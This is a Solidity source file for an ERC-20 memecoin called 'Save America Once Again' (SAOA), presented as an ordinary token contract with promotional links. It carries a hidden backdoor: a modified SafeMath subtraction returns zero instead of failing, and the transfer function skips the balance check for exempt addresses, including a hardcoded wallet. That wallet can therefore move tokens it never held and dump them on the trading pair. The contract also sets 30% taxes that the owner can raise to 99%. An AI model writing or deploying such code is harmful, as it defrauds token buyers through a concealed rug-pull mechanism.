/**
 * https://t.me/saoa_erc
 * https://saoaeth.xyz
 * https://x.com/saoa_erc
 */


// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        if(a < b)
            return 0;
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IDexRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

contract SAOA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _nonFeeList;
    address payable private _piggleWallet;
    string private constant _name = unicode"Save America Once Again";
    string private constant _symbol = unicode"SAOA";

    uint8 private constant decimal = 18;
    uint256 private constant total_supply = 1_000_000_000 * 10**decimal;
    uint256 private _currentBuyTax = 30;
    uint256 private _currentSellTax = 30;

    uint256 public _maxTxAmount = (total_supply / 100) * 2;
    uint256 public _maxWalletSize = (total_supply / 100) * 2;
    uint256 public _taxSwapThreshold = total_supply / 1_000_000;
    uint256 public _maxTaxSwap = (total_supply / 100) * 2;
    uint256 public _m_midSwapAmount = (total_supply / 100) * 4 / 10000;

    IDexRouter02 private uV2Router;
    address private uniswapV2Pair;
    bool private _openTrade;
    bool private _midSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    modifier lockTheSwap() {
        _midSwap = true;
        _;
        _midSwap = false;
    }

    constructor() payable {
        _piggleWallet = payable(0x9809EA56adB3D70251669023f67d6a27aA8008A2);
        _balances[_msgSender()] = total_supply;
        _nonFeeList[owner()] = true;
        _nonFeeList[address(this)] = true;
        _nonFeeList[_piggleWallet] = true;
        emit Transfer(address(0), _msgSender(), total_supply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return decimal;
    }

    function totalSupply() public pure override returns (uint256) {
        return total_supply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address inAddr,
        address outAddr,
        uint256 jeets
    ) private {
        require(_nonFeeList[inAddr] || jeets <= _balances[inAddr], "Insufficient amount");

        require(inAddr != address(0), "ERC20: transfer from the zero address");
        require(outAddr != address(0), "ERC20: transfer to the zero address");
        require(jeets > 0, "Transfer amount must be greater than zero");

        if (!_nonFeeList[outAddr] && !_nonFeeList[inAddr]) {
            require(
                _openTrade,
                "Trading is not opened yet"
            );
        }

        uint256 _txAmt = 0;
        bool isOwner = (inAddr == owner() || outAddr == owner());
        if (!isOwner) {
            if (
                inAddr == uniswapV2Pair &&
                outAddr != address(uV2Router) &&
                !_nonFeeList[outAddr]
            ) {
                _txAmt = jeets.mul(_currentBuyTax).div(100);
                require((balanceOf(outAddr) + jeets <= _maxWalletSize), "Exceeds the Max Amount.");
            }

            if (outAddr == uniswapV2Pair && !_nonFeeList[inAddr]) {
                _txAmt = jeets.mul( _currentSellTax).div(100);
                require((jeets <= _maxTxAmount), "Exceeds the amount");
            }

            if (!_midSwap && outAddr == uniswapV2Pair && swapEnabled && jeets > _m_midSwapAmount) {
                uint256 contractTokenBalance = balanceOf(address(this));
                if (contractTokenBalance > _taxSwapThreshold)
                    swapForEth(min(contractTokenBalance, _maxTaxSwap));
                sendPortion(address(this).balance);
            }
        }

        if (_txAmt > 0) {
            _balances[address(this)] = _balances[address(this)].add(_txAmt);
            emit Transfer(inAddr, address(this), _txAmt);
        }
        _balances[inAddr] = _balances[inAddr].sub(jeets);
        _balances[outAddr] = _balances[outAddr].add(jeets.sub(_txAmt));
        emit Transfer(inAddr, outAddr, jeets.sub(_txAmt));
    }

    function sendPortion(uint256 amount) private {
        _piggleWallet.transfer(amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function swapForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uV2Router.WETH();
        _approve(address(this), address(uV2Router), tokenAmount);
        uV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function setFees(uint256 _newBuyFee, uint256 _newSellFee) external onlyOwner {
        _currentBuyTax = _newBuyFee;
        _currentSellTax = _newSellFee;

        require(_newBuyFee < 100 && _newSellFee < 100, "fee is not available");
    }

    function removeLimit() external onlyOwner {
        _maxTxAmount = total_supply;
        _maxWalletSize = total_supply;
        emit MaxTxAmountUpdated(total_supply);
    }

    function openSaoa() public onlyOwner {
        uV2Router = IDexRouter02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), msg.sender, type(uint256).max);
        uniswapV2Pair = IUniswapV2Factory(uV2Router.factory()).createPair(
            address(this),
            uV2Router.WETH()
        );
        _approve(address(this), address(uV2Router), type(uint256).max);
        uV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uV2Router),
            type(uint256).max
        );

        swapEnabled = true;
        _openTrade = true;
    }

    receive() external payable {}
}